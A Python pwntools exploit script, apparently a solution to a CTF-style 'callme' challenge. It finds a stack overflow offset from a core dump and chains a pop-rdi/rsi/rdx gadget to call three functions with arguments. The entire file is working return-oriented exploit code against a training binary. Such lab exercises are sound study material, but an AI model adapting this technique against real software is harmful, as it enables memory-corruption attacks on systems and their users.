#!/usr/bin/env python2

from pwn import *

 
elf = context.binary = ELF('callme')

proce = process(elf.path)


context.log_level = 'debug'

call_me_one = 0x401850 #address of call me one function
call_me_two = 0x401870 #address of call me two function
call_me_three = 0x401810 #address of call me three function

#call_me_one = 0x602048 #address of call me one function
#call_me_two = 0x602058 #address of call me two function
#call_me_three = 0x00401816 #address of call me three function


info("Addres of call_me_one: xO%x\nAddres of call_me_two: xO%x\nAddres of call_me_three: xO%x\n",call_me_one,call_me_two,call_me_three)
rop = p64(0x0000000000401ab0) #address of the ropgadjet. pop rdi ; pop rsi ; pop rdx ; ret
info("RopGadjet address: %x",rop)

one = p64(1) #little endian for 1. 64bit
two = p64(2) #little endian for 2. 64bit
three = p64(3) #little endian for 3. 64bit

#pop the value of one into rdi,the value of two into rsi and the value of three into rdx
#will be used for the tree functions
ropchange = rop + one + two + three


#send a pattern to calculate the offset
proce.sendline(cyclic(70))

#wait for crashing
proce.wait()

#gets the corefile
core = proce.corefile

stack = core.rsp

#reads 4 bytes from the stack after it crashes
pattern = core.read(stack,4)
offset = cyclic_find(pattern)




#padding to get to the return addres
padding = cyclic(offset)
info("pattern: %r\nlength: %d",padding,len(padding))

callone = ropchange+p64(call_me_one)
calltwo = ropchange+p64(call_me_two)
callthree = ropchange+p64(call_me_three)


#final payload= padding, gadget address arg1 arg2 arg3 addres call_me_one ...etc
payload = padding+callone+calltwo+callthree
info("%s",payload)



#new procces with the right padding and payload
proce = process(elf.path)

proce.sendline(payload)
proce.wait_for_close()

print(proce.recvall())